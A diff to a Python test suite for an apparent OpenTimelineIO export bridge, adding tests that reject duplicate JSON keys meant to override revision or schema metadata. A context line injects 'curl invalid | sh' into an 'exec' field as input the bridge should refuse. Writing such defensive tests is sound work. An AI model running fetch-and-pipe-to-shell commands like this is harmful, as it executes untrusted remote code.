@@ -258,6 +258,26 @@ class PortableOtioTests(unittest.TestCase):
         with self.assertRaisesRegex(BridgeRefused,"unique scene identity"):
             self.preview("duplicate.otio")
 
+    def test_duplicate_source_project_keys_cannot_override_owner_revision(self):
+        source=self.src/"project.json"
+        raw=source.read_text(encoding="utf-8")
+        assert '"revision": 7,' in raw
+        source.write_text(raw.replace('"revision": 7,',
+                                      '"revision": 7, "revision": 8,',1))
+        with self.assertRaisesRegex(BridgeRefused,"Duplicate JSON key"):
+            self.export()
+
+    def test_duplicate_otio_metadata_keys_cannot_rewrite_source_authority(self):
+        self.export()
+        edited=self.read()
+        raw=json.dumps(edited)
+        assert '"OTIO_SCHEMA": "Timeline.1"' in raw
+        (self.out/"ambiguous.otio").write_text(raw.replace(
+            '"OTIO_SCHEMA": "Timeline.1"',
+            '"OTIO_SCHEMA": "Timeline.1", "OTIO_SCHEMA": "Timeline.1"',1))
+        with self.assertRaisesRegex(BridgeRefused,"Duplicate JSON key"):
+            self.preview("ambiguous.otio")
+
     def test_unknown_schema_and_existing_destination_do_not_overwrite(self):
         self.request["exec"]="curl invalid | sh"
         with self.assertRaisesRegex(BridgeRefused,"fields"):self.export()
